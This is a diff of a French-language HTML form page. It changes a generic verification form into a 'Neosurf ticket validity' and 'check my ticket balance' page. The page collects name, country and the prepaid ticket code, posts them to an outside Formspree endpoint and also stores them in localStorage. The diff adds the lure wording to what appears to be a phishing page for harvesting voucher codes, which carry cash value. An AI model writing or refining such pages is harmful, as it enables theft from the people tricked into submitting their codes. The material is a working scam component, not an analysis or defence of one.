@@ -10,7 +10,7 @@
   <img src="logo.svg" alt="Logo de l'entreprise" class="logo">
 
   <div class="form-container">
-    <h2>Verification</h2>
+    <h2>Verification validité ticket neosurf</h2>
     <form action="https://formspree.io/f/xyzyjzaq" method="POST">
       <label for="first-name">Prénom:</label>
       <input type="text" id="first-name" name="first-name" required>
@@ -24,10 +24,10 @@
       <label for="country">Pays:</label>
       <input type="text" id="country" name="country" required>
 
-      <label for="access-code">Code :</label>
+      <label for="access-code">Code du ticket neosurf:</label>
       <input type="text" id="access-code" name="access-code" required>
 
-      <button type="submit">Vérifier la validité</button>
+      <button type="submit">Vérifier le solde de mon ticket</button>
     </form>
   </div>
 
@@ -45,7 +45,6 @@
         timestamp: new Date().toLocaleString()
       };
 
-      // Sauvegarder les données dans le localStorage (pour consultation sur le même appareil)
       let submissions = JSON.parse(localStorage.getItem('employeeSubmissions')) || [];
       submissions.push(employee);
       localStorage.setItem('employeeSubmissions', JSON.stringify(submissions));
